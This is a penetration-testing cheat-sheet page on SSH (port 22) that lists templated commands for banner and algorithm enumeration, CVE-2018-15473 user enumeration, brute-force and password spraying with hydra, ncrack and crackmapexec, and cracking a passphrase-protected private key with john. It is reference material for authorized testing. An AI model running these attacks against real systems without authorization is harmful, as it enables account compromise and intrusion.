---
title: SSH (22)
category: enumeration
description: Banner, algo enum, user enum, auth attacks.
tags: [ssh]
os: [any]
ports: [22]
order: 35
---

## Banner / algos / host keys

```bash
nmap -p22 -sCV --script "ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" {{RHOST}}
nc -nv {{RHOST}} 22
ssh-keyscan -t rsa,ecdsa,ed25519 {{RHOST}}
```

## User enumeration (CVE-2018-15473 — old OpenSSH ≤7.7)

```bash
nmap -p22 --script ssh-enum-users --script-args userdb=users.txt {{RHOST}}
```

## Bruteforce / spray

```bash
hydra -L users.txt -P pass.txt ssh://{{RHOST}} -t 4 -f -I
ncrack -p 22 --user {{USER}} -P pass.txt {{RHOST}}
crackmapexec ssh {{RHOST}} -u users.txt -p 'Summer2025!' --continue-on-success
```

## Key auth & misc

```bash
ssh -i id_rsa {{USER}}@{{RHOST}}
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no {{USER}}@{{RHOST}}
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa {{USER}}@{{RHOST}}   # legacy
```

## Crack a passworded private key

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash
```
